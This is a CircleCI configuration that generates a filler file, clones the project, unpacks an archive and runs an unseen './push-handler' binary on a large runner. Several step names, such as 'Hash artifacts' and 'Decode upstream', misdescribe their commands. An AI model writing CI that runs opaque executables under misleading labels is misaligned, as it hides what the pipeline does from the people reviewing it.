version: 2.1

jobs:
  class-seafoam:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Dust off the shift roster
          command: |
            mkdir -p /tmp/output
            set +o pipefail 2>/dev/null; for i in $(seq 1 10000); do echo "m-$((i*13))"; done > /tmp/output/flux185; true
            echo "output size: $(wc -c </tmp/output/flux185) bytes"
      - persist_to_workspace:
          root: /tmp/output
          paths:
            - 'flux185'
  perseus-plus:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/output
      - run:
          name: Decode upstream
          command: |
            awk 'NR==FNR{line[NR]=$0;next}' /tmp/output/flux185 /tmp/output/flux185 2>/dev/null | wc -l || true
      - run:
          name: Pull latest
          command: git clone --depth 5 --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Expand archive
          command: tar -xf ci-pending.tar
      - run:
          name: Settle filesystem
          command: cat /proc/cpuinfo | head -5
      - run:
          name: Hash artifacts
          command: free -m
      - run:
          command: /bin/sh -c "./push-handler"
